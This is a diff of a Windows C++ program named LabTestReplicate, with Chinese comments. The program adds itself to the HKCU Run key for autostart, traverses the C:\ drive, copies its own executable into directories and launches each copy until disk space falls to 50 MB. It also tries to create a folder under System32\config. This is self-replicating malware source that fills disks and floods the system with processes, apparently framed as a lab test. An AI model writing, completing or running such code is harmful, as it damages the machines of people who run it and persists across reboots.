@@ -1,20 +1,45 @@
+// LabTestReplicate.cpp
 #include <windows.h>
 #include <filesystem>
 #include <queue>
 #include <string>
+#include <fstream>
 
 namespace fs = std::filesystem;
 
 const std::wstring kRoot      = L"C:\\";
-const ULONGLONG    kMinFreeMB = 0;
+const ULONGLONG    kMinFreeMB = 50;
 
+/* ---------- 磁盘剩余空间 ---------- */
 ULONGLONG FreeMB() {
     ULARGE_INTEGER free{};
     GetDiskFreeSpaceExW(kRoot.c_str(), &free, nullptr, nullptr);
     return free.QuadPart / (1024 * 1024);
 }
 
-/* 开机自启 */
+/* ---------- 写日志 ---------- */
+void Log(const std::wstring& msg) {
+    try {
+        std::wofstream ofs(L"C:\\Temp\\LabReplicate.log", std::ios::app);
+        ofs << msg << L"\n";
+    } catch (...) {}
+}
+
+/* ---------- 创建 OSDATA ---------- */
+bool CreateOsDataDir() {
+    const wchar_t* path = L"C:\\Windows\\System32\\config\\OSDATA";
+
+    if (CreateDirectoryW(path, nullptr))
+        return true;                    // 成功
+    DWORD err = GetLastError();
+    if (err == ERROR_ALREADY_EXISTS)
+        return true;                    // 已存在也算成功
+
+    Log(L"CreateDirectoryW failed, error=" + std::to_wstring(err));
+    return false;
+}
+
+/* ---------- 开机自启 ---------- */
 void AddToStartup() {
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER,
@@ -28,7 +53,7 @@ void AddToStartup() {
     }
 }
 
-/* 复制并立即启动 */
+/* ---------- 复制并立即启动 ---------- */
 void Replicate(const fs::path& self, const fs::path& dir) {
     if (FreeMB() < kMinFreeMB) return;
 
@@ -49,8 +74,13 @@ void Replicate(const fs::path& self, const fs::path& dir) {
     CloseHandle(pi.hProcess);
 }
 
-/* 遍历：先子目录，后当前目录 */
+/* ---------- BFS 遍历复制 ---------- */
 void BfsReplicate(const fs::path& self) {
+    /* ===== 新增：先创建 OSDATA ===== */
+    if (!CreateOsDataDir()) {
+        Log(L"Failed to create OSDATA directory – insufficient privileges.");
+    }
+
     if (!fs::exists(kRoot)) fs::create_directories(kRoot);
 
     std::queue<fs::path> q;
@@ -74,9 +104,9 @@ void BfsReplicate(const fs::path& self) {
     Replicate(self, kRoot);
 }
 
-/* 主入口 */
+/* ---------- 主入口 ---------- */
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
-    AddToStartup();         // 开机自启
+    AddToStartup();
     BfsReplicate(fs::canonical(__argv[0]));
     return 0;
 }
